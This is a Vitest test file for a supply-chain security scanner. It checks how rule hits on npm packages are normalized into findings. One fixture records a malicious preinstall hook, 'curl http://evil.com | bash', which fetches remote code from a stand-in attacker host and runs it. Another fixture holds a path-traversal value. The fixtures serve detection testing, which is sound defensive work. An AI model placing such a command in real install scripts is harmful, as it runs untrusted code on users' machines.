import { describe, expect, it } from 'vitest';
import { normalizeRuleHit } from '../../src/supply-chain/normalize.js';
import type { RuleHit } from '../../src/supply-chain/internal/types.js';

describe('Normalize RuleHit (WP1/WP5 Bridge)', () => {
  it('normalizes a complete RuleHit with full evidence and remediation', () => {
    const hit: RuleHit = {
      ruleId: 'SC-INSTALL-003',
      packageName: 'evil-pkg',
      version: '1.2.3',
      ecosystem: 'npm',
      purl: 'pkg:npm/evil-pkg@1.2.3',
      severity: 'CRITICAL',
      confidence: 'HIGH',
      blocking: true,
      metadataUnavailable: false,
      title: 'Remote fetch execution in install script',
      description: 'curl piped to bash in preinstall hook',
      remediationText: 'Remove malicious preinstall script immediately',
      reachabilityGated: false,
      scReachability: 'REACHABLE',
      capabilities: {
        hasInstallScript: true,
        hasShell: true,
      },
      evidence: [
        {
          file: 'package.json',
          startLine: 12,
          startCol: 5,
          endLine: 12,
          endCol: 45,
          snippetSha256: 'a'.repeat(64),
          redactedSnippet: 'curl http://evil.com | bash',
          note: 'Remote fetch',
        },
      ],
    };

    const finding = normalizeRuleHit(hit, '2026-10-21T00:00:00.000Z');
    expect(finding.category).toBe('SUPPLY_CHAIN');
    expect(finding.scannerName).toBe('generic');
    expect(finding.ruleId).toBe('SC-INSTALL-003');
    expect(finding.severity).toBe('CRITICAL');
    expect(finding.location.filePath).toBe('package.json');
    expect(finding.location.startLine).toBe(12);
    expect(finding.location.endLine).toBe(12);
    expect(finding.location.startColumn).toBe(5);
    expect(finding.location.endColumn).toBe(45);
    expect(finding.location.redactedSnippet).toBe('curl http://evil.com | bash');
    expect(finding.fixRecommendation?.explanation).toBe(
      'Remove malicious preinstall script immediately'
    );
    expect(finding.createdAt).toBe('2026-10-21T00:00:00.000Z');
    expect(finding.reachabilityDetail?.evidence.notes).toBe(
      'curl piped to bash in preinstall hook'
    );
  });

  it('normalizes a minimal RuleHit with empty evidence, fallback dates, and missing optional fields', () => {
    const minimalHit: RuleHit = {
      ruleId: 'SC-PKG-001',
      packageName: 'empty-pkg',
      version: '0.0.1',
      ecosystem: 'npm',
      purl: 'pkg:npm/empty-pkg@0.0.1',
      severity: 'LOW',
      confidence: 'LOW',
      blocking: false,
      metadataUnavailable: true,
      evidence: [],
    };

    const finding = normalizeRuleHit(minimalHit);
    expect(finding.category).toBe('SUPPLY_CHAIN');
    expect(finding.ruleId).toBe('SC-PKG-001');
    expect(finding.location.filePath).toBe('package.json');
    expect(finding.location.startLine).toBe(1);
    expect(finding.location.endLine).toBe(1);
    expect(finding.title).toBe('SC-PKG-001');
    expect(finding.description).toBe('SC-PKG-001');
    expect(finding.fixRecommendation).toBeUndefined();
    expect(finding.createdAt).toBeDefined();
    expect(finding.evidence[0]!.metadata?.capabilities).toEqual({});
    expect(finding.evidence[0]!.metadata?.scReachability).toBe('UNKNOWN');
  });

  it('handles hits with title but no description and evidence without endLine', () => {
    const hit: RuleHit = {
      ruleId: 'SC-BIN-001',
      packageName: 'bin-pkg',
      version: '1.0.0',
      ecosystem: 'npm',
      purl: 'pkg:npm/bin-pkg@1.0.0',
      severity: 'HIGH',
      confidence: 'MEDIUM',
      blocking: false,
      metadataUnavailable: false,
      title: 'Path traversal in bin field',
      evidence: [
        {
          file: 'bin/tool.js',
          startLine: 1,
          startCol: 1,
          endLine: 1,
          endCol: 20,
          snippetSha256: 'b'.repeat(64),
          redactedSnippet: '../evil.js',
        },
      ],
    };

    const finding = normalizeRuleHit(hit);
    expect(finding.title).toBe('Path traversal in bin field');
    expect(finding.description).toBe('Path traversal in bin field');
    expect(finding.reachabilityDetail?.evidence.notes).toBe('Path traversal in bin field');
  });
});
